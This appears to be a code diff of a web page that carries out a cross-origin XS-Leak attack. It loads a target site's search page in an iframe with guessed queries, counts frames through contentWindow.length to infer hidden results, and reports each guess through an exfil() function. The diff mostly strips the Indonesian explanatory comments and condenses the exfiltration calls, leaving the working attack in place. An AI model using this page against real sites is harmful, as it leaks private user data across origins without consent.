@@ -26,18 +26,9 @@ if (!guess) {
   iframe.src = TARGET + '/search?q=' + encodeURIComponent(guess);
 
   iframe.onload = function() {
-    // window.length bisa dibaca cross-origin!
-    // kalau ada iframe embed PDF di search page → iframe.contentWindow.length = 1
-    // kalau tidak ada → 0
     try {
       const len = iframe.contentWindow.length;
-      exfil({
-        status: 'done',
-        guess,
-        idx,
-        win_length: len,
-        hit: len > 0 ? '1' : '0'
-      });
+      exfil({ status: 'done', guess, idx, win_length: len, hit: len > 0 ? '1' : '0' });
     } catch(e) {
       exfil({ status: 'error', guess, idx, err: e.message });
     }
@@ -49,9 +40,7 @@ if (!guess) {
 
   document.body.appendChild(iframe);
 
-  setTimeout(() => {
-    exfil({ status: 'timeout', guess, idx });
-  }, 8000);
+  setTimeout(() => exfil({ status: 'timeout', guess, idx }), 8000);
 }
 </script>
 </body>
